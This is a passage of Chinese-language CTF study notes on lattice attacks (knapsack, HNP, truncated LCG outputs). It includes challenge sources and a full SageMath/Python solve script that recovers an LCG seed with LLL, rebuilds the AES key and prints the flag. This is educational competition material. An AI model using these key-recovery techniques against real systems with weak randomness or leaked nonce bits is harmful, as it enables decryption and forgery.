m</li></ul></blockquote><p>超递增序列举个例子：</p><p>1、2、4、8、16  这个你可以发现每个数都是大于前面的全部和</p><p><strong>加密</strong></p><p>明文是一系列的0和1组成的二进制数据v</p><p>生成一个大整数c  c是选入的超级递增序列私钥的和 再模m</p><p><img src="https://gitee.com/happy_superman/happy/raw/master/202408021535691.png" alt="image-20240720005950692"></p><p><strong>解密</strong></p><p>恢复v</p><p><img src="https://gitee.com/happy_superman/happy/raw/master/202408021535692.png" alt="image-20240720010041229"></p><p>构造格：把问题 归结到格上</p><p><img src="https://gitee.com/happy_superman/happy/raw/master/202408021535693.png" alt="image-20240720010619106"></p><h3 id="hnp">HNP</h3><p>基于DSA签名算法生成公式：</p><p><img src="https://gitee.com/happy_superman/happy/raw/master/202408021535694.png" alt="image-20230827123417580"></p><p>M相当于构造格子的基向量 然后乘系数m 得到的结果就是一系列格子的基向量</p><p>构造格子的注意事项</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">M = matrix(QQ,<span class="number">40</span>,<span class="number">40</span>)  <span class="comment">#表示在有理数域中创建40*40的格子 默认初始为0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">38</span>):</span><br><span class="line">    M[i,i] = p  <span class="comment">#对角线</span></span><br><span class="line">    M[-<span class="number">2</span>,i] = b[i] * inv <span class="comment">#倒数第二行</span></span><br><span class="line">    M[-<span class="number">1</span>,i] = -r[i] * inv <span class="comment">#倒数第一行</span></span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/happy_superman/happy/raw/master/202408021535695.png" alt="image-20230824080018407"></p><p>举个栗子：</p><p>MTCTF2022 strange_rsa3</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag3</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">qBits = <span class="number">2048</span></span><br><span class="line">pBits = <span class="number">512</span></span><br><span class="line">num = <span class="number">2</span></span><br><span class="line">q = getPrime(qBits)</span><br><span class="line">p = [getPrime(pBits) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(num)]</span><br><span class="line">r = [getRandomRange(<span class="number">1</span>, <span class="number">2</span>**(pBits * <span class="number">2</span>))]</span><br><span class="line"> </span><br><span class="line">a = getRandomRange(<span class="number">1</span>, <span class="number">2</span>**pBits)</span><br><span class="line">b = getRandomRange(<span class="number">1</span>, <span class="number">2</span>**pBits)</span><br><span class="line">gift = (p[<span class="number">0</span>] * a - p[<span class="number">1</span>]) * inverse(b, p[<span class="number">0</span>] * p[<span class="number">1</span>]**<span class="number">2</span>) % (p[<span class="number">0</span>] * p[<span class="number">1</span>]**<span class="number">2</span>)</span><br><span class="line">r.append(a * r[<span class="number">0</span>] % p[<span class="number">1</span>]**<span class="number">2</span>)</span><br><span class="line"> </span><br><span class="line">n = [p[i] * q + r[i] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(num)]</span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line">c = <span class="built_in">pow</span>(bytes_to_long(flag3), e, q)</span><br><span class="line"> </span><br><span class="line">output = <span class="built_in">open</span>(<span class="string">&#x27;output.txt&#x27;</span>, <span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">output.write(<span class="string">&#x27;n = &#x27;</span> + <span class="built_in">str</span>(n) + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">output.write(<span class="string">&#x27;c = &#x27;</span> + <span class="built_in">str</span>(c) + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">output.write(<span class="string">&#x27;gift = &#x27;</span> + <span class="built_in">str</span>(gift) + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"> </span><br><span class="line"> n = [<span class="number">334024028297795358428409534536782438908850190596668304865805437854374647984162763213581202801755428896203566172506219587266859416880045688129543855047675462354257676254231028533265496444966553195988075269677126779791155950793986187076641998741755872346979307739639779735262978907659727511419480461209503641512912873117056664008629779726881137366723127568036608925132936367006658464077463797854166622020483102972486974655232026096153672010479488999300909745157075526157596970246521452157940857495163175605553461432715056788388724755538433445976849818771932805940067427962262593386608298455471107791678224956504101174392785507134071131842103995133811964997751791768061100121699973057595724142612170517768245173187399850847945628945800042668385798893530527806229363060713249</span>, <span class="number">270672332309468804376393577492871858269490099887383011988714622534037610808764741901954257217313289938393835900354736668003700671505047142365053976908516056996483106174902631762442253779775073373220342445779447626486345253598470015470094856727845150372622299396840670432953284676150980428391739322739397783248924710490946083987879121564403742528241040454099534823772379455574658130173290640751198753015984316400694738114541263533626932367096040344071742474883684682734122111076840572805111010694147825191233741720325878397443178835435703420465683485344417909319591496135706730327376897531024858122747777315158814568580929655522627811650949169204543250919027738723235091257934106114809110289433115714333069841583284243937630033653684708127947780848521445941847102881070046</span>]</span><br><span class="line"> c = <span class="number">24426016715355498456650532748209528249200902516644306644652290745346403378221744208791754411669322694597831272399935610924080672864361088045894354412944203199767471898920740773322967470374385635042086816010876203117884874681450622109443867183037282062248951073356702181165103759051513426785435705002047708435055880616309144483691648077981524802908185706596363674820857151388761087408514551645305031742705266691826719380663571699663832536944531865183586885154128228789310222929701360939023228059118720311899056620389378996862413971733056546988166759451010742768802840638380019172710929867945108511664271273569394689619</span></span><br><span class="line">gift = <span class="number">173299379625576798749821685155193435290573235640007530711924098468561852299646118206367598564087551037396665586630782838190274697684611102346492601699992667822233634078800006099513099432664305226448819277556828816420517850404262393535832488384876680039695417291460237594174659357055221582914415278609167623124281569332881993050546046852564902573985929794261636296569394448935231131668411811662581097119330330246497311885207256858435515769776396794250803110128999</span></span><br></pre></td></tr></table></figure><p>首先对n0和n1进行分析</p><p>n0 = p0 * q + r0  512bits 2048bits 1024bits</p><p>n1 = p1 * q + r1</p><p>n0/n1 = p0/p1 +r0/q/r1/q 约等于p0/p1</p><p>第二个栗子：</p><h4 id="npuctf2020-babylcg">NPUCTF2020-babyLCG</h4><p>考点:closed_lock_with_key::LCG随机数生成器 AES加密 HNP</p><p>题目：</p> <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">LCG</span>:</span><br><span class="line">    <span class="comment">#相当于java里面的构造方法 调用类名则执行</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, bit_length</span>):</span><br><span class="line">        m = getPrime(bit_length)</span><br><span class="line">        a = getRandomRange(<span class="number">2</span>, m)</span><br><span class="line">        b = getRandomRange(<span class="number">2</span>, m)</span><br><span class="line">        seed = getRandomRange(<span class="number">2</span>, m)</span><br><span class="line">        self._key = &#123;<span class="string">&#x27;a&#x27;</span>:a, <span class="string">&#x27;b&#x27;</span>:b, <span class="string">&#x27;m&#x27;</span>:m&#125;</span><br><span class="line">        self._state = seed</span><br><span class="line">    <span class="comment">#相当于java里面的成员方法  </span></span><br><span class="line">    <span class="comment">#第一次调用则是 s1 = a * seed + b % m  则seed = （s1 - b） * inverse（a，m） %m</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">next</span>(<span class="params">self</span>):</span><br><span class="line">        self._state = (self._key[<span class="string">&#x27;a&#x27;</span>] * self._state + self._key[<span class="string">&#x27;b&#x27;</span>]) % self._key[<span class="string">&#x27;m&#x27;</span>]</span><br><span class="line">        <span class="keyword">return</span> self._state</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">export_key</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> self._key</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">gen_lcg</span>():</span><br><span class="line">    rand_iter = LCG(<span class="number">128</span>)</span><br><span class="line">    key = rand_iter.export_key()</span><br><span class="line">    f = <span class="built_in">open</span>(<span class="string">&quot;key&quot;</span>, <span class="string">&quot;w&quot;</span>)</span><br><span class="line">    f.write(<span class="built_in">str</span>(key))</span><br><span class="line">    <span class="keyword">return</span> rand_iter</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">leak_data</span>(<span class="params">rand_iter</span>):</span><br><span class="line">    f = <span class="built_in">open</span>(<span class="string">&quot;old&quot;</span>, <span class="string">&quot;w&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">20</span>):</span><br><span class="line">        <span class="comment">#写入的时候右移了64位 所以调用的时候要左移64位</span></span><br><span class="line">        f.write(<span class="built_in">str</span>(rand_iter.<span class="built_in">next</span>() &gt;&gt; <span class="number">64</span>) + <span class="string">&quot;\n&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> rand_iter</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">rand_iter</span>):</span><br><span class="line">    f = <span class="built_in">open</span>(<span class="string">&quot;ct&quot;</span>, <span class="string">&quot;wb&quot;</span>)</span><br><span class="line">    key = rand_iter.<span class="built_in">next</span>() &gt;&gt; <span class="number">64</span></span><br><span class="line">    key = (key &lt;&lt; <span class="number">64</span>) + (rand_iter.<span class="built_in">next</span>() &gt;&gt; <span class="number">64</span>)</span><br><span class="line">    <span class="comment">#这是生成16字节 即128bits的密钥 从而如果key转化后长度不够则在末尾用指定字符\x00进行补充</span></span><br><span class="line">    key = long_to_bytes(key).ljust(<span class="number">16</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">    iv = long_to_bytes(rand_iter.<span class="built_in">next</span>()).ljust(<span class="number">16</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">    cipher = AES.new(key, AES.MODE_CBC, iv)</span><br><span class="line">    pt = flag + (<span class="number">16</span> - <span class="built_in">len</span>(flag) % <span class="number">16</span>) * <span class="built_in">chr</span>(<span class="number">16</span> - <span class="built_in">len</span>(flag) % <span class="number">16</span>)</span><br><span class="line">    ct = cipher.encrypt(pt.encode())</span><br><span class="line">    f.write(ct)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    rand_iter = gen_lcg()</span><br><span class="line">    rand_iter = leak_data(rand_iter)</span><br><span class="line">    encrypt(rand_iter)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>首先是lcg随机数的生成</p><p>给出了密钥k m b</p><p>lcg随机数的生成公式：s<sub>i+1</sub> = a * s<sub>i</sub> + b (mod m)</p><p>并且已知每一个随机数泄露的高64bits的数据</p><p>所以将s分为高位h和低位部分l</p><p>（h<sub>i+1</sub> + l<sub>i+1</sub>) = a * (h<sub>i</sub> + l<sub>i</sub>)+ b (mod m)</p><p>l<sub>i+1</sub> = a * l<sub>i</sub> + a * h<sub>i</sub> + b - h<sub>i+1</sub> (mod m)</p><p>其中l<sub>i+1</sub> 和 l<sub>i</sub> 未知 其他均已知</p><p>每次相乘保证l<sub>i</sub>存在则需要设置相应的A<sub>i</sub>和B<sub>i</sub></p><p>构造为：</p><p><img src="https://gitee.com/happy_superman/happy/raw/master/202408021535696.png" alt="image-20230824193501277"></p><p>因为这个数是128bits的 然后高64位已知 所以低位l最大是64bits <strong>右下角K是轮密钥的上界</strong> 所以构造格子</p><p><img src="https://gitee.com/happy_superman/happy/raw/master/202408021535697.png" alt="image-20230824193749518"></p><p>使得存在一个向量与M相乘 得到的结果向量内各元素大小接近</p><p><img src="https://gitee.com/happy_superman/happy/raw/master/202408021535698.png" alt="image-20230824193909022"></p><p>这样构建了格子之后 对格子使用LLL()算法 取出第0行倒数第二列的数值 成功获得第一个低位的数值</p><p>然后和高位拼接 恢复原始s1 从而获得seed</p><p>代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#sage</span></span><br><span class="line">b=<span class="number">153582801876235638173762045261195852087</span></span><br><span class="line">a=<span class="number">107763262682494809191803026213015101802</span></span><br><span class="line">m=<span class="number">226649634126248141841388712969771891297</span></span><br><span class="line"></span><br><span class="line">h = [<span class="number">0</span>,<span class="number">7800489346663478448</span>,<span class="number">11267068470666042741</span>,<span class="number">5820429484185778982</span>,<span class="number">6151953690371151688</span>,<span class="number">548598048162918265</span>,<span class="number">1586400863715808041</span>,<span class="number">7464677042285115264</span>,<span class="number">4702115170280353188</span>,<span class="number">5123967912274624410</span>,<span class="number">8517471683845309964</span>,<span class="number">2106353633794059980</span>,<span class="number">11042210261466318284</span>,<span class="number">4280340333946566776</span>,<span class="number">6859855443227901284</span>,<span class="number">3149000387344084971</span>,<span class="number">7055653494757088867</span>,<span class="number">5378774397517873605</span>,<span class="number">8265548624197463024</span>,<span class="number">2898083382910841577</span>,<span class="number">4927088585601943730</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(h)):</span><br><span class="line">    h[i] &lt;&lt;= <span class="number">64</span></span><br><span class="line">A = [<span class="number">1</span>]<span class="comment">#首项为a</span></span><br><span class="line">B = [<span class="number">0</span>]<span class="comment">#首项为a*h[i]+b-h[i+1]</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="built_in">len</span>(h)-<span class="number">1</span>):</span><br><span class="line">    A.append(a*A[i-<span class="number">1</span>] % m)</span><br><span class="line">    B.append((a*B[i-<span class="number">1</span>]+a*h[i]+b-h[i+<span class="number">1</span>]) % m)</span><br><span class="line">A = A[<span class="number">1</span>:]</span><br><span class="line">B = B[<span class="number">1</span>:]</span><br><span class="line"></span><br><span class="line"><span class="comment"># print(len(A))   长度为19 </span></span><br><span class="line"><span class="comment"># print(B)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 利用A和B开始 构造格子  整数域 21*21</span></span><br><span class="line">M = matrix(ZZ,<span class="number">21</span>,<span class="number">21</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">19</span>):</span><br><span class="line">    M[i,i] = m</span><br><span class="line">    M[<span class="number">20</span>,i] = B[i]</span><br><span class="line">    M[<span class="number">19</span>,i] = A[i]</span><br><span class="line">M[<span class="number">20</span>,<span class="number">20</span>] = <span class="number">2</span> ** <span class="number">64</span>  </span><br><span class="line">M[<span class="number">19</span>,<span class="number">19</span>] = <span class="number">1</span></span><br><span class="line"><span class="comment"># print(M)</span></span><br><span class="line">M = M.LLL()  <span class="comment">#会获得很多组向量 一般取第一个</span></span><br><span class="line">l1 = M[<span class="number">0</span>][-<span class="number">2</span>]</span><br><span class="line">s1 = l1 + h[<span class="number">1</span>]</span><br><span class="line"><span class="comment"># print(s1)</span></span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="comment">#根据原式转换：seed = （s1 - b） * inverse（a，m） %m</span></span><br><span class="line">seed = ((s1 - b)*gmpy2.invert(a,m))%m</span><br><span class="line"><span class="built_in">print</span>(seed)</span><br><span class="line"><span class="comment">#73991202721494681711496408225724067994</span></span><br></pre></td></tr></table></figure><p>获取seed之后就是去解决AES问题了</p><p>注意AES是对称加密体系中的算法 所以其加密程序和解密程序是有非常密切的关系的</p><p>我们只需要和加密时使用相同的算法获得密钥key 和初始向量iv即可构建相同的AES密码器</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="comment"># from secret import flag</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">LCG</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, bit_length</span>):</span><br><span class="line">        <span class="comment">#反向解题 就要把未知量换为已知 </span></span><br><span class="line">        b = <span class="number">153582801876235638173762045261195852087</span></span><br><span class="line">        a = <span class="number">107763262682494809191803026213015101802</span> </span><br><span class="line">        m = <span class="number">226649634126248141841388712969771891297</span></span><br><span class="line">        seed = <span class="number">73991202721494681711496408225724067994</span></span><br><span class="line">        self._key = &#123;<span class="string">&#x27;a&#x27;</span>:a, <span class="string">&#x27;b&#x27;</span>:b, <span class="string">&#x27;m&#x27;</span>:m&#125;</span><br><span class="line">        self._state = seed</span><br><span class="line">        </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">next</span>(<span class="params">self</span>):</span><br><span class="line">        self._state = (self._key[<span class="string">&#x27;a&#x27;</span>] * self._state + self._key[<span class="string">&#x27;b&#x27;</span>]) % self._key[<span class="string">&#x27;m&#x27;</span>]</span><br><span class="line">        <span class="keyword">return</span> self._state</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">export_key</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> self._key</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">gen_lcg</span>():</span><br><span class="line">    rand_iter = LCG(<span class="number">128</span>)</span><br><span class="line">    key = rand_iter.export_key()</span><br><span class="line">    <span class="comment"># f = open(&quot;key&quot;, &quot;w&quot;)</span></span><br><span class="line">    <span class="comment"># f.write(str(key))</span></span><br><span class="line">    <span class="keyword">return</span> rand_iter</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">leak_data</span>(<span class="params">rand_iter</span>):</span><br><span class="line">    f = <span class="built_in">open</span>(<span class="string">&quot;old&quot;</span>, <span class="string">&quot;w&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">20</span>):</span><br><span class="line">        f.write(<span class="built_in">str</span>(rand_iter.<span class="built_in">next</span>() &gt;&gt; <span class="number">64</span>) + <span class="string">&quot;\n&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> rand_iter</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">deleak_data</span>(<span class="params">rand_iter</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">20</span>):</span><br><span class="line">        rand_iter.<span class="built_in">next</span>()</span><br><span class="line">    <span class="keyword">return</span> rand_iter</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># def encrypt(rand_iter):</span></span><br><span class="line"><span class="comment">#     f = open(&quot;ct&quot;, &quot;wb&quot;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#     key = rand_iter.next() &gt;&gt; 64</span></span><br><span class="line"><span class="comment">#     key = (key &lt;&lt; 64) + (rand_iter.next() &gt;&gt; 64)</span></span><br><span class="line"><span class="comment">#     key = long_to_bytes(key).ljust(16, b&#x27;\x00&#x27;)</span></span><br><span class="line"><span class="comment">#     iv = long_to_bytes(rand_iter.next()).ljust(16, b&#x27;\x00&#x27;)</span></span><br><span class="line"><span class="comment">#     cipher = AES.new(key, AES.MODE_CBC, iv)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#     pt = flag + (16 - len(flag) % 16) * chr(16 - len(flag) % 16)</span></span><br><span class="line"><span class="comment">#     ct = cipher.encrypt(pt.encode())</span></span><br><span class="line">    <span class="comment"># f.write(ct)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">rand_iter</span>):</span><br><span class="line">    key = rand_iter.<span class="built_in">next</span>() &gt;&gt; <span class="number">64</span></span><br><span class="line">    key = (key &lt;&lt; <span class="number">64</span>) + (rand_iter.<span class="built_in">next</span>() &gt;&gt; <span class="number">64</span>)</span><br><span class="line">    key = long_to_bytes(key).ljust(<span class="number">16</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">    iv = long_to_bytes(rand_iter.<span class="built_in">next</span>()).ljust(<span class="number">16</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">    cipher = AES.new(key, AES.MODE_CBC, iv)</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;C:\\Users\\jayq\\Desktop\\附件\\ct&quot;</span>,<span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        ct = f.read()</span><br><span class="line">    mt = cipher.decrypt(ct)</span><br><span class="line">    <span class="built_in">print</span>(mt)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    rand_iter = gen_lcg()</span><br><span class="line">    rand_iter = deleak_data(rand_iter)</span><br><span class="line">    decrypt(rand_iter)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line"><span class="comment">#b&#x27;npuctf&#123;7ruc4t3d-L(G-4nd-LLL-4r3-1nt3r3st1ng&#125;\x04\x04\x04\x04&#x27;</span></span><br></pre></td></tr></table></figure><p>第二个栗子:chestnut::</p><h4 id="wmctf-2023-crypto-signin">WMCTF-2023-Crypto signin</h4><p>考点: p高位泄露</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> randrange</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pr</span>(<span class="params">msg</span>):</span><br><span class="line">    <span class="built_in">print</span>(msg)</span><br><span class="line"></span><br><span class="line">pr(<span class="string">br&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">                        ....&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;....                        </span></span><br><span class="line"><span class="string">                     .`&quot;,:;;II;II;;;;:,&quot;^&#x27;.                    </span></span><br><span class="line"><span class="string">                  &#x27;&quot;IlllI;;;;;;;;;;;;;Il!!l;^.                 </span></span><br><span class="line"><span class="string">                `l&gt;&lt;&gt;!!!!!!!!iiiii!!!!!!!!i&gt;&lt;!&quot;.               </span></span><br><span class="line"><span class="string">             &#x27;:&gt;?]__++~~~~~&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;~~+__i&quot;.            </span></span><br><span class="line"><span class="string">           .:i+&#125;&#123;]?-__+++~~~~~~&lt;&lt;&lt;&lt;&lt;~~~~~~+_-?[\1_!^           </span></span><br><span class="line"><span class="string">          .;&lt;_&#125;\&#123;]-_++~&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;~+-?]\|]+&lt;^          </span></span><br><span class="line"><span class="string">          .!-&#123;t|[?-&#125;(|(()&#123;_&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;_&#125;1)))1&#125;??]&#123;t|]_&quot;          </span></span><br><span class="line"><span class="string">           